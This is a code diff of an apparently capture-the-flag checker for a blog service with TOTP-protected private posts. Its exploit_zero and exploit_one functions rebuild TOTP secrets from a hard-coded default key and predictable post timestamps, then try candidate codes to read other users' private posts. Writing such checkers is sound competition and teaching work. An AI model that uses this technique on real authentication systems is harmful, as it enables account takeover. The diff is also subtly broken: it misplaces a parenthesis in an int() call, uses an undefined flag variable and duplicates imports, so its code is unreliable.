@@ -1,11 +1,9 @@
 import json
 import os
-import re
 import secrets
 import string
 import hashlib
 import hmac
-from itertools import zip_longest
 from logging import LoggerAdapter
 from typing import List, Optional, Tuple
 from bs4 import BeautifulSoup
@@ -17,9 +15,18 @@ from enochecker3 import (
     ChainDB,
     Enochecker,
     ExploitCheckerTaskMessage,
-    GetflagCheckerTaskMessage,
-    MumbleException,
+    FlagSearcher,
+    BaseCheckerTaskMessage,
     PutflagCheckerTaskMessage,
+    GetflagCheckerTaskMessage,
+    PutnoiseCheckerTaskMessage,
+    GetnoiseCheckerTaskMessage,
+    HavocCheckerTaskMessage,
+    MumbleException,
+    OfflineException,
+    InternalErrorException,
+    PutflagCheckerTaskMessage,
+    AsyncSocket,
 )
 from enochecker3.utils import FlagSearcher, assert_equals, assert_in
 from httpx import AsyncClient, Request, Response
@@ -252,7 +259,7 @@ async def getflag_zero(
     r = await client.get('/auth/accountInfo', cookies=cookie)
     logger.debug(f"accessing accountinfo: {r.text}")
     date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
-    timestamp = convert_str_to_unixtimestamp(date)
+    timestamp = convert_str_to_unixtimestamp(date, True)
 
     totp_device = Totp_Client(init_time=timestamp)
     totp_device.generate_shared_secret(postkey)
@@ -285,7 +292,7 @@ async def getflag_one(
     r = await client.get('/auth/accountInfo', cookies=cookie)
     logger.debug(f"accessing accountinfo: {r.text}")
     date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
-    timestamp = convert_str_to_unixtimestamp(date)
+    timestamp = convert_str_to_unixtimestamp(date, True)
 
     totp_device = Totp_Client(init_time=timestamp)
     totp_device.generate_shared_secret(postkey)
@@ -326,12 +333,16 @@ def finddata_for_exploit(r, username, title):
         raise MumbleException(msg)
 
 
-def convert_str_to_unixtimestamp(timestr):
-    #date = time[0]
-    #timec = time[1]
-    #timec = timec.split('.', 1)[0]
+def convert_str_to_unixtimestamp(time, isstring):
+    date = None
+    timec = None
 
-    date, timec = timestr.split(' ', 1)
+    if isstring:
+        date, timec = time.split(' ', 1)
+    else:
+        date = time[0]
+        timec = time[1]
+
     datecomp=date.split('-')
     timecomp=timec.split(':')
     if len(timecomp) == 2:
@@ -373,12 +384,12 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
     time, posturl = finddata_for_exploit(r, username, title)
     default_key = "Correct horse battery staple!"
     #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
-    timestamp = int(convert_str_to_unixtimestamp(time))
+    timestamp = int(convert_str_to_unixtimestamp(time, False))
     totp_device = Totp_Client(init_time=timestamp)
     totp_device.generate_shared_secret(default_key)
     totp_device.calculate_current_timestep_count()
 
-    rangep = 60/totp_device.timestep
+    rangep = int(60/totp_device.timestep)
     for i in range(rangep):
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
         #logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
@@ -419,20 +430,30 @@ async def exploit_one(task: ExploitCheckerTaskMessage,
     attackinfo = json.loads(task.attack_info)
     postid = attackinfo['postid']
 
-    username, password  = await register_user(task, client, logger)
-    cookie = await login_user(task, client, logger, username, password)
-    r = await client.get("/", cookies=cookie)
+    inviter, ipassword  = await register_user(task, client, logger)
+    guest, gpassword = await register_user(task, client, logger)
+
+    cookie = await login_user(task, client, logger, inviter, ipassword)
+    r = await client.get("/auth/accessblogpost/"+str(postid), cookies=cookie)
+    html = BeautifulSoup(r.text, "html.parser")
+    content = html.find('section', attrs={"class":"content"})
+    heading = content.find('h1').string
+    title = heading.split(' ')[0]
+    logger.debug(f"the title is: {title}")
+
+
+    title, secret = await create_blogpost(client, logger, cookie, flag, is_private=True, is_hidden=False, inviteduser=guest)
 
     # use the title to find relevant info
-    time, posturl = finddata_for_exploit(r, username, title)
+    time, posturl = finddata_for_exploit(r, guest, title)
     default_key = "Correct horse battery staple!"
     #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
-    timestamp = int(convert_str_to_unixtimestamp(time))
+    timestamp = int(convert_str_to_unixtimestamp(time), False)
     totp_device = Totp_Client(init_time=timestamp)
     totp_device.generate_shared_secret(default_key)
     totp_device.calculate_current_timestep_count()
 
-    rangep = 60/totp_device.timestep
+    rangep = int(60/totp_device.timestep)
     for i in range(rangep):
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
         #logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
